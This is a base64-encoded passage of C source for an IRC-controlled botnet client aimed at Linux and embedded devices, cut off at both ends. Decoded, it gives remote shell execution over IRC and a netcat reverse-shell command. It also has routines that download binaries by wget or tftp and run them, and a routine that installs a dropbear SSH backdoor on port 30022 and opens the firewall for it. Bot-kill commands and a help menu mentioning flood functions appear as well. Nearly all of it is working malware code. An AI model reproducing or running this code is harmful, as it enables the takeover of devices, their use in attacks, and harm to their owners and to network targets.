CAgICAgICAgICAgICAgIGdvdG8gZG9uZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZG9uZToKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6SW5zdGFsbGVkICVzIHRvIGhhY2sgcGF0aC5cbiIsc2VuZGVyLGFyZ3ZbMl0pOwogICAgICAgIHdoaWxlKDEpIHsKICAgICAgICAgICAgICAgIGludCBpLGQ7CiAgICAgICAgICAgICAgICBpZiAoKGk9cmVjdihzb2NrMixidWZtLDQwOTYsMCkpIDw9IDApIGJyZWFrOwogICAgICAgICAgICAgICAgaWYgKGkgPCA0MDk2KSBidWZtW2ldPTA7CiAgICAgICAgICAgICAgICBmb3IgKGQ9MDtkPGk7ZCsrKSBmcHV0YyhidWZtW2RdLGZpbGUpOwogICAgICAgIH0KICAgICAgICBmY2xvc2UoZmlsZSk7CiAgICAgICAgY2xvc2Uoc29jazIpOwoJY2hhciBNb3ZlSXRbMjU1XTsKCXNwcmludGYoTW92ZUl0LCAiY2F0ICVzID4gL3Zhci9iaW4vJXMiLGFyZ3ZbMl0sYXJndlsyXSk7CglzeXN0ZW0oTW92ZUl0KTsKCWNoYXIgRGVsZXRlSXRbMjU1XTsKCXNwcmludGYoRGVsZXRlSXQsICJybSAlcyIsYXJndlsyXSxhcmd2WzJdKTsKCXN5c3RlbShEZWxldGVJdCk7CgljaGFyIFN0cmluZ1syNTVdOwoJc3ByaW50ZihTdHJpbmcsICJjaG1vZCA3NzUgL3Zhci9iaW4vJXMiLGFyZ3ZbMl0pOwoJc3lzdGVtKFN0cmluZyk7CgljaGFyIFN0cmluZzJbMjU1XTsKCXNwcmludGYoU3RyaW5nMiwgImxzIC1sIC92YXIvYmluLyVzIixhcmd2WzJdKTsKCXN5c3RlbShTdHJpbmcyKTsKICAgICAgICBleGl0KDApOwp9Cgp2b2lkIGhlbHAoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICAgICAgaWYgKG1mb3JrKHNlbmRlcikgIT0gMCkgcmV0dXJuOwoJU2VuZChzb2NrLCIjQCNAI0AjQCMgOkZsaWJpZGkgRmxhYmVkaSBGbHVwcFxuIERvIHlvdSB0aGluayBvZiBzdWNoIGFuIHVuY3JlYXRpdmUgbmFtZSBhZ2FpbiEgeEQgI0AjQCNAI0AjQCIsc2VuZGVyKTsgc2xlZXAoMSk7CiAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlBBTiA8dGFyZ2V0PiA8cG9ydD4gPHNlY3M+ICAgICAgICAgICAgICAgICAgICAgICA9IGZ1bmN0aW9uIGhhcyBiZWVuIGNvbXBsZXRlbHkgcmVtb3ZlZCEgc2lnbmVkIGJ5IEhpbGRlR2FyZFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6VURQIDx0YXJnZXQ+IDxwb3J0PiA8c2Vjcz4gICAgICAgICAgICAgICAgICAgICAgID0gZnVuY3Rpb24gaGFzIGJlZW4gY29tcGxldGVseSByZW1vdmVkISBzaWduZWQgYnkgSGlsZGVHYXJkXG4iLHNlbmRlcik7IHNsZWVwKDEpOwogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpVTktOT1dOIDx0YXJnZXQ+IDxzZWNzPiAgICAgICAgICAgICAgICAgICAgICAgICAgPSBmdW5jdGlvbiBoYXMgYmVlbiBjb21wbGV0ZWx5IHJlbW92ZWQhIHNpZ25lZCBieSBIaWxkZUdhcmRcbiIsc2VuZGVyKTsgc2xlZXAoMSk7CgogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpOSUNLIDxuaWNrPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBDaGFuZ2VzIHRoZSBuaWNrIG9mIHRoZSBjbGllbnRcbiIsc2VuZGVyKTsgc2xlZXAoMSk7CgkJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlNFUlZFUiA8c2VydmVyPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA9IENoYW5nZXMgc2VydmVyc1xuIixzZW5kZXIpOyBzbGVlcCgxKTsKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6R0VUU1BPT0ZTICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gR2V0cyB0aGUgY3VycmVudCBzcG9vZmluZ1xuIixzZW5kZXIpOyBzbGVlcCgxKTsKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6U1BPT0ZTIDxzdWJuZXQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gQ2hhbmdlcyBzcG9vZmluZyB0byBhIHN1Ym5ldFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKCiAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOkRJU0FCTEUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA9IERpc2FibGVzIGFsbCBwYWNrZXRpbmcgZnJvbSB0aGlzIGNsaWVudFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6RU5BQkxFICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gRW5hYmxlcyBhbGwgcGFja2V0aW5nIGZyb20gdGhpcyBjbGllbnRcbiIsc2VuZGVyKTsgc2xlZXAoMSk7CgoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOkdFVCA8aHR0cCBhZGRyZXNzPiA8c2F2ZSBhcz4gICAgICAgICAgICAgICAgICAgICA9IERvd25sb2FkcyBhIGZpbGUgb2ZmIHRoZSB3ZWIgYW5kIHNhdmVzIGl0IG9udG8gdGhlIGhkXG4iLHNlbmRlcik7IHNsZWVwKDEpOwoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlVQREFURSA8aHR0cCBhZGRyZXNzPiA8c3JjOmJpbj4gICAgICAgICAgICAgICAgICA9IFVwZGF0ZSB0aGlzIGJvdFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKCVNlbmQoc29jaywiTk9USUNFICVzIDpIQUNLUEtHIDxodHRwIGFkZHJlc3M+IDxiaW4gbmFtZT4gICAgICAgICAgICAgICAgPSBIYWNrUGtnIGlzIGhlcmUhIEluc3RhbGwgYSBiaW4sIHVzaW5nIGh0dHAsIG5vIGRlcGVuZHMhXG4iLHNlbmRlcik7IHNsZWVwKDEpOwogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpWRVJTSU9OICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBSZXF1ZXN0cyB2ZXJzaW9uIG9mIGNsaWVudFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6SEVMUCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gRGlzcGxheXMgdGhpc1xuIixzZW5kZXIpOyBzbGVlcCgxKTsKCglTZW5kKHNvY2ssIk5PVElDRSAlcyA6SVJDIDxjb21tYW5kPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gU2VuZHMgdGhpcyBjb21tYW5kIHRvIHRoZSBzZXJ2ZXJcbiIsc2VuZGVyKTsgc2xlZXAoMSk7CglTZW5kKHNvY2ssIk5PVElDRSAlcyA6U0ggPGNvbW1hbmQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gRXhlY3V0ZXMgYSBjb21tYW5kXG4iLHNlbmRlcik7IHNsZWVwKDEpOwoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOklTSCA8Y29tbWFuZD4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA9IFNILCBpbnRlcmFjdGl2ZSwgc2VuZHMgdG8gY2hhbm5lbFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKCVNlbmQoc29jaywiTk9USUNFICVzIDpTSEQgPGNvbW1hbmQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBFeGVjdXRlcyBhIHBzdWVkby1kYWVtb25pemVkIGNvbW1hbmRcbiIsc2VuZGVyKTsgc2xlZXAoMSk7CglTZW5kKHNvY2ssIk5PVElDRSAlcyA6R0VUQkIgPHRmdHAgc2VydmVyPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gR2V0IGEgcHJvcGVyIGJ1c3lib3hcbiIsc2VuZGVyKTsgc2xlZXAoMSk7CgogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpJTlNUQUxMICA8aHR0cCBzZXJ2ZXIvZmlsZV9uYW1lPiAgICAgICAgICAgICAgICAgPSBEb3dubG9hZCAmIGluc3RhbGwgYSBiaW5hcnkgdG8gL3Zhci9iaW4gXG4iLHNlbmRlcik7IHNsZWVwKDEpOwogICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpCQVNIIDxjbWQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBFeGVjdXRlIGNvbW1hbmRzIHVzaW5nIGJhc2guIFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6QklOVVBEQVRFIDxodHRwOnNlcnZlci9wYWNrYWdlPiAgICAgICAgICAgICAgICAgID0gVXBkYXRlIGEgYmluYXJ5IGluIC92YXIvYmluIHZpYSB3Z2V0IFxuIixzZW5kZXIpOyBzbGVlcCgxKTsKICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6U0NBTiA8bm1hcCBvcHRpb25zPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gQ2FsbCB0aGUgbm1hcCB3cmFwcGVyIHNjcmlwdCBhbmQgc2NhbiB3aXRoIHlvdXIgb3B0cy4gXG4iLHNlbmRlcik7IHNsZWVwKDEpOwoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlJTSEVMTCA8c2VydmVyPiA8cG9ydD4gICAgICAgICAgICAgICAgICAgICAgICAgICA9IEVxdWF0ZXMgdG8gbm9odXAgbmMgaXAgcG9ydCAtZSAvYmluL3NoXG4iLHNlbmRlcik7IHNsZWVwKDEpOwoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOkxPQ0tVUCA8aHR0cDpzZXJ2ZXI+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICA9IEtpbGwgdGVsbmV0LCBkL2wgYWVzIGJhY2tkb29yIGZyb20gPHNlcnZlcj4sIHJ1biB0aGF0IGluc3RlYWQuXG4iLHNlbmRlcik7IHNsZWVwKDEpOwoJU2VuZChzb2NrLCJOT1RJQ0UgJXMgOkdFVFNTSCA8aHR0cDpzZXJ2ZXIvZHJvcGJlYXJtdWx0aT4gICAgICAgICAgICAgICA9IEQvbCwgaW5zdGFsbCwgY29uZmlndXJlIGFuZCBzdGFydCBkcm9wYmVhciBvbiBwb3J0IDMwMDIyLlxuIixzZW5kZXIpOyBzbGVlcCgxKTsKCWV4aXQoMCk7Cn0KLy8gS2lsbGFsbCBwYWNrZXRpbmcgZnJvbSB0aGUgRE9TIGZ1bmN0aW9ucwp2b2lkIGtpbGxhbGwoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICAgICAgdW5zaWduZWQgbG9uZyBpOwogICAgICAgIGZvciAoaT0wO2k8bnVtcGlkcztpKyspIHsKICAgICAgICAgICAgICAgIGlmIChwaWRzW2ldICE9IDAgJiYgcGlkc1tpXSAhPSBnZXRwaWQoKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc2VuZGVyKSBTZW5kKHNvY2ssIk5PVElDRSAlcyA6S2lsbGluZyBwaWQgJWQuXG4iLHNlbmRlcixwaWRzW2ldKTsKICAgICAgICAgICAgICAgICAgICAgICAga2lsbChwaWRzW2ldLDkpOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KfQovLyBLaWxsIHRoZSBib3QKdm9pZCBraWxsZChpbnQgc29jaywgY2hhciAqc2VuZGVyLCBpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKCWNoYXIgYnVmWzEwMjRdPXswfTsKCWlmIChkaXNhYmxlZCA9PSAxKSByZXR1cm47CglzcHJpbnRmKGJ1Ziwia2lsbCAtOSAlZDtraWxsIC05IDAiLGFjdHVhbHBhcmVudCk7CglzeXN0ZW0oYnVmKTsKCWV4aXQoMCk7Cgp9Ci8vIElmIHlvdSBhZGQgeW91ciBvd24gZnVuY3Rpb25zLCBiZSBzdXJlIHRvIGFkZCB0aGVtIGhlcmUgKFNlZSBiZWxvdyBbKipdKQpzdHJ1Y3QgRk1lc3NhZ2VzIHsgY2hhciAqY21kOyB2b2lkICgqIGZ1bmMpKGludCxjaGFyICosaW50LGNoYXIgKiopOyB9IGZsb29kZXJzW10gPSB7CiAgICAgICAgeyAiTklDSyIsIG5pY2tjIH0sCiAgICAgICAgeyAiU0VSVkVSIiwgbW92ZSB9LAoJeyAiR0VUU1BPT0ZTIiwgZ2V0c3Bvb2ZzIH0sCiAgICAgICAgeyAiU1BPT0ZTIiwgc3Bvb2YgfSwKCXsgIkhBQ0tQS0ciLCBoYWNrcGtnIH0sCgl7ICJESVNBQkxFIiwgZGlzYWJsZSB9LAogICAgICAgIHsgIkVOQUJMRSIsIGVuYWJsZSB9LAogICAgICAgIHsgIlVQREFURSIsIHVwZGF0ZSB9LAogICAgICAgIHsgIlRPRVRFREVOQ0xJRU5UIiwga2lsbGQgfSwKCXsgIkdFVCIsIGdldCB9LAogICAgICAgIHsgIlZFUlNJT04iLCB2ZXJzaW9uIH0sCiAgICAgICAgeyAiVE9FVEVBTExFQk9UUyIsIGtpbGxhbGwgfSwKICAgICAgICB7ICJIRUxQIiwgaGVscCB9LAp7IChjaGFyICopMCwgKHZvaWQgKCopKGludCxjaGFyICosaW50LGNoYXIgKiopKTAgfSB9Owp2b2lkIF9QUklWTVNHKGludCBzb2NrLCBjaGFyICpzZW5kZXIsIGNoYXIgKnN0cikgewogICAgICAgIGludCBpOwogICAgICAgIGNoYXIgKnRvLCAqbWVzc2FnZTsKICAgICAgICBmb3IgKGk9MDtpPHN0cmxlbihzdHIpICYmIHN0cltpXSAhPSAnICc7aSsrKTsKICAgICAgICBzdHJbaV09MDsKICAgICAgICB0bz1zdHI7CiAgICAgICAgbWVzc2FnZT1zdHIraSsyOwogICAgICAgIGZvciAoaT0wO2k8c3RybGVuKHNlbmRlcikgJiYgc2VuZGVyW2ldICE9ICchJztpKyspOwogICAgICAgIHNlbmRlcltpXT0wOwogICAgICAgIGlmICgqbWVzc2FnZSA9PSAnIScgJiYgIXN0cmNhc2VjbXAodG8sY2hhbikpIHsKICAgICAgICAgICAgICAgIGNoYXIgKnBhcmFtc1sxMl0sIG5hbWVbMTAyNF09ezB9OwogICAgICAgICAgICAgICAgaW50IG51bV9wYXJhbXM9MCwgbTsKICAgICAgICAgICAgICAgIG1lc3NhZ2UrKzsKICAgICAgICAgICAgICAgIGZvciAoaT0wO2k8c3RybGVuKG1lc3NhZ2UpICYmIG1lc3NhZ2VbaV0gIT0gJyAnO2krKyk7CiAgICAgICAgICAgICAgICBtZXNzYWdlW2ldPTA7CiAgICAgICAgICAgICAgICBpZiAoc3Ryd2lsZG1hdGNoKG1lc3NhZ2UsbmljaykpIHJldHVybjsKICAgICAgICAgICAgICAgIG1lc3NhZ2UrPWkrMTsKICAgICAgICAgICAgICAgIGlmICghc3RybmNtcChtZXNzYWdlLCJJUkMgIiw0KSkgaWYgKGRpc2FibGVkKSBTZW5kKHNvY2ssIk5PVElDRSAlcyA6VW5hYmxlIHRvIGNvbXBseS5cbiIsc2VuZGVyKTsgZWxzZSBTZW5kKHNvY2ssIiVzXG4iLG1lc3NhZ2UrNCk7CiAgICAgICAgICAgICAgICBpZiAoIXN0cm5jbXAobWVzc2FnZSwiU0ggIiwzKSkgewogICAgICAgICAgICAgICAgICAgICAgICBjaGFyIGJ1ZlsxMDI0XTsKICAgICAgICAgICAgICAgICAgICAgICAgRklMRSAqY29tbWFuZDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG1mb3JrKHNlbmRlcikgIT0gMCkgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgICAgICBtZW1zZXQoYnVmLDAsMTAyNCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHNwcmludGYoYnVmLCJleHBvcnQgUEFUSD0vdmFyL2JpbjovYmluOi9zYmluOi91c3IvYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjslcyIsbWVzc2FnZSszKTsKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZD1wb3BlbihidWYsInIiKTsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUoIWZlb2YoY29tbWFuZCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW1zZXQoYnVmLDAsMTAyNCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmdldHMoYnVmLDEwMjQsY29tbWFuZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOiVzXG4iLHNlbmRlcixidWYpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNsZWVwKDEpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHBjbG9zZShjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgwKTsKICAgICAgICAgICAgICAgIH0KCi8vWyoqXSBUaGlzIGlzIHRoZSBleGNlcHRpb24sIGJlY2F1c2UgdGhlc2UgYXJlIGFsbCBwYXJ0IG9mIHRoZSBwcml2bXNnIGZ1bmN0aW9uCgkJLy8gU0hEIChkYWVtb25pemUgc2ggY29tbWFuZCkKCQlpZiAoIXN0cm5jbXAobWVzc2FnZSwiU0hEICIsNCkpIHsKCQkJY2hhciBidWZbMTAyNF07CgkJCUZJTEUgKmNvbW1hbmQ7CgkJCWlmIChtZm9yayhzZW5kZXIpICE9IDApIHJldHVybjsKCQkJbWVtc2V0KGJ1ZiwwLDEwMjQpOwoJCQlzcHJpbnRmKGJ1ZiwiZXhwb3J0IEhPTUU9L3RtcDtleHBvcnQgUEFUSD0vYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdmFyL2Jpbjt0cmFwICcnIDEgMjsgc2ggLWMgJyVzJyYiLG1lc3NhZ2UrNCk7CgkJCWNvbW1hbmQ9cG9wZW4oYnVmLCJyIik7CgkJCXdoaWxlKCFmZW9mKGNvbW1hbmQpKSB7CgkJCQltZW1zZXQoYnVmLDAsMTAyNCk7CgkJCQlmZ2V0cyhidWYsMTAyNCxjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6JXNcbiIsc2VuZGVyLGJ1Zik7CgkJCQlzbGVlcCgxKTsKCQkJfQoJCQlwY2xvc2UoY29tbWFuZCk7CgkJCWV4aXQoMCk7CgkJfQovLyJJbnRlcmFjdGl2ZSIgU0ggY29tbWFuZCAoU2VuZHMgdG8gY2hhbm5lbCBpbnN0ZWFkIG9mIHN0YXR1cykJCgkJaWYgKCFzdHJuY21wKG1lc3NhZ2UsIklTSCAiLDMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXIgYnVmWzEwMjRdOwogICAgICAgICAgICAgICAgICAgICAgICBGSUxFICpjb21tYW5kOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAobWZvcmsoc2VuZGVyKSAhPSAwKSByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgIG1lbXNldChidWYsMCwxMDI0KTsKICAgICAgICAgICAgICAgICAgICAgICAgc3ByaW50ZihidWYsImV4cG9ydCBIT01FPS90bXA7ZXhwb3J0IFBBVEg9L3Zhci9iaW46L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW47JXMiLG1lc3NhZ2UrMyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ9cG9wZW4oYnVmLCJyIik7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCFmZW9mKGNvbW1hbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGJ1ZiwwLDEwMjQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZnZXRzKGJ1ZiwxMDI0LGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vU2VuZChzb2NrLCJOT1RJQ0UgJXMgOiVzXG4iLHNlbmRlcixidWYpOwoJCQkJU2VuZChzb2NrLCJQUklWTVNHICVzIDolc1xuIixDSEFOLGJ1Zik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xlZXAoMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcGNsb3NlKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICBleGl0KDApOwoJfQovLyBHRVRCQiAodGhpcyBpbnN0YWxscyBhIGJldHRlciBidXN5Ym94LCB2aWEgdGZ0cC4gVGhpcyBmdW5jLCBsaWtlIHRoZSByZXN0LCBoYXMgYSBkZXBlbmRlbmN5IHRoYXQgd2Ugd291bGQgbGlrZSBlbGltaW5hdGUgKGluIHRoaXMgY2FzZSB0ZnRwKS4KCQlpZiAoIXN0cm5jbXAobWVzc2FnZSwiR0VUQkIgIiw2KSkgewoJCQljaGFyIGJ1ZlsxMDI0XTsKCQkJRklMRSAqY29tbWFuZDsKCQkJaWYgKG1mb3JrKHNlbmRlcikgIT0gMCkgcmV0dXJuOwoJCQltZW1zZXQoYnVmLDAsMTAyNCk7CgkJCXNwcmludGYoYnVmLCJleHBvcnQgZmlsZUdldD1idXN5Ym94O2V4cG9ydCBQQVRIPS9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi92YXIvYmluO2NkIC92YXI7KChbICEgLWUgL3Zhci9cIiRmaWxlR2V0XCIgXSB8fCBbICEgLXMgL3Zhci9cIiRmaWxlR2V0XCIgXSkgJiYgdGZ0cCAtZyAtciBcIiRmaWxlR2V0XCIgJXMgJiYgY2htb2QgK3ggXCIkZmlsZUdldFwiICYmIC4vXCIkZmlsZUdldFwiIG1rZGlyIGJpbiAmJiAuL1wiJGZpbGVHZXRcIiAtLWluc3RhbGwgLXMgL3Zhci9iaW4gJiYgbHMgLWwgXCIkZmlsZUdldFwiIHx8IGVjaG8gSXQgYXBwZWFycyB3ZSBhbHJlYWR5IGhhdmUgL3Zhci9cIiRmaWxlR2V0XCIpIixtZXNzYWdlKzYpOwoJCQljb21tYW5kPXBvcGVuKGJ1ZiwiciIpOwoJCQl3aGlsZSghZmVvZihjb21tYW5kKSkgewoJCQkJbWVtc2V0KGJ1ZiwwLDEwMjQpOwoJCQkJZmdldHMoYnVmLDEwMjQsY29tbWFuZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOiVzXG4iLHNlbmRlcixidWYpOwoJCQkJc2xlZXAoMSk7CgkJCX0KCQkJcGNsb3NlKGNvbW1hbmQpOwoJCQlleGl0KDApOwoJCX0KCQkKCi8vIEdFVFNTSCAoZG93bmxvYWQsIGluc3RhbGwsIHN0YXJ0IGRyb3BiZWFyLCByZXF1aXJlcyBidXN5Ym94IGZvciB3Z2V0LCBtdiwgc29tZXQgb3RoZXIgdGhpbmdzIHRoYXQgYXJlIG5vdCBhbHdheXMgcHJlc2VudCBvbiBlbWJlZGRlZCBkZXZpY2VzCgkJaWYgKCFzdHJuY21wKG1lc3NhZ2UsIkdFVFNTSCAiLDcpKSB7CgkJCWNoYXIgYnVmWzEwMjRdOwoJCQlGSUxFICpjb21tYW5kOwoJCQlpZiAobWZvcmsoc2VuZGVyKSAhPSAwKSByZXR1cm47CgkJCW1lbXNldChidWYsMCwxMDI0KTsKCQkJc3ByaW50ZihidWYsImV4cG9ydCBQQVRIPS92YXIvYmluOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluO2NkIC90bXA7ZXhwb3J0IHVybD0lcztuYW1lPWBlY2hvIFwiJHVybFwiIHwgc2VkICdzIy5ceDJhLyMjJ2AgJiYgd2dldCAtTyBcIiRuYW1lXCIgXCIkdXJsXCI7Y2htb2QgK3ggXCIkbmFtZVwiO212IFwiJG5hbWVcIiAvdmFyL2JpbjtscyAtbCAvdmFyL2Jpbi9cIiRuYW1lXCIgJiYgZHNzPS92YXIvZGJzL2Ryb3BiZWFyX2Rzc19ob3N0X2tleTtyc2E9L3Zhci9kYnMvZHJvcGJlYXJfcnNhX2hvc3Rfa2V5O2VjZD0vdmFyL2Ricy9kcm9wYmVhcl9lY2RzYV9ob3N0X2tleTtjZCAvdmFyL2Jpbjtmb3IgaSBpbiBkcm9wYmVhciBkYmNsaWVudCBkcm9wYmVhcmtleSBkcm9wYmVhcmNvbnZlcnQ7ZG8gbG4gLXMgL3Zhci9iaW4vZHJvcGJlYXJtdWx0aSAkaTtkb25lO1sgISAtZCAvdmFyL2RicyBdICYmIG1rZGlyIC92YXIvZGJzO1sgLWYgJGRzcyBdIHx8IGRyb3BiZWFya2V5IC10IGRzcyAtZiAkZHNzO1sgLWYgJHJzYSBdIHx8IGRyb3BiZWFya2V5IC10IHJzYSAtZiAkcnNhO1sgLWYgJGVjZCBdIHx8IGRyb3BiZWFya2V5IC10IGVjZHNhIC1mICRlY2Q7ZHJvcGJlYXIgLXIgJGRzcyAtciAkcnNhIC1yICRlY2QgLXAgMzAwMjI7aXB0YWJsZXMgLUkgSU5QVVQgMSAtcCB0Y3AgLS1kcG9ydCAzMDAyMiAtaiBBQ0NFUFQiLG1lc3NhZ2UrNyk7CgkJCWNvbW1hbmQ9cG9wZW4oYnVmLCJyIik7CgkJCXdoaWxlKCFmZW9mKGNvbW1hbmQpKSB7CgkJCQltZW1zZXQoYnVmLDAsMTAyNCk7CgkJCQlmZ2V0cyhidWYsMTAyNCxjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6JXNcbiIsc2VuZGVyLGJ1Zik7CgkJCQlzbGVlcCgxKTsKCQkJfQoJCQlwY2xvc2UoY29tbWFuZCk7CgkJCWV4aXQoMCk7CgkJfQoKCi8vIElOU1RBTEwgKHZpYSB3Z2V0LCBkb3dubG9hZHMgYW5kIGluc3RhbGwgYSBmaWxlIGludG8gb3VyIGhhY2sgcGF0aC4pCgoJCWlmICghc3RybmNtcChtZXNzYWdlLCJJTlNUQUxMICIsOCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY2hhciBidWZbMTAyNF07CiAgICAgICAgICAgICAgICAgICAgICAgIEZJTEUgKmNvbW1hbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChtZm9yayhzZW5kZXIpICE9IDApIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgbWVtc2V0KGJ1ZiwwLDEwMjQpOwogICAgICAgICAgICAgICAgIAlzcHJpbnRmKGJ1ZiwiZXhwb3J0IFBBVEg9L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Zhci9iaW47ZXhwb3J0IHVybD0lcztleHBvcnQgbmFtZT1gZWNobyBcIiR1cmxcIiB8IHNlZCAncyMuXHgyYS8jIydgOygoWyAhIC1lIC92YXIvYmluLyRuYW1lIF0gfHwgWyAhIC1zIC92YXIvYmluLyRuYW1lIF0pICYmIGVjaG8gXCIkbmFtZSBlaXRoZXIgZG9lc250IGV4aXN0IG9yIGVxIDAgc28gd2UgZ2V0XCIgJiYgY2QgL3RtcCAmJiB3Z2V0IC1PIFwiJG5hbWVcIiBcIiR1cmxcIiAmJiBjaG1vZCAreCBcIiRuYW1lXCIgJiYgbXYgXCIkbmFtZVwiIC92YXIvYmluICYmIChbIC1mIC92YXIvYmluLyRuYW1lIF0gJiYgbHMgLWwgL3Zhci9iaW4vJG5hbWUpIHx8IGVjaG8gXCJJdCBhcHBlYXJzIEkgYWxyZWFkeSBoYXZlICRuYW1lXCIpIixtZXNzYWdlKzgpOwoJCQljb21tYW5kPXBvcGVuKGJ1ZiwiciIpOwogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSghZmVvZihjb21tYW5kKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbXNldChidWYsMCwxMDI0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmZ2V0cyhidWYsMTAyNCxjb21tYW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6JXNcbiIsc2VuZGVyLGJ1Zik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xlZXAoMSk7CgkJCX0KICAgICAgICAgICAgICAgICAgICAgICAgcGNsb3NlKGNvbW1hbmQpOwogICAgICAgICAgICAgICAgICAgICAgICBleGl0KDApOwogICAgICAgICAgICAgICAgfQoKCi8vIEJJTlVQREFURSBodHRwOi8vc2VydmVyL2ZpbGUgKGxpa2UgaW5zdGFsbCwgYnV0IHVwZGF0ZXMgdGhlIHByb2dyYW0pCgoJCWlmICghc3RybmNtcChtZXNzYWdlLCJCSU5VUERBVEUgIiwxMCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY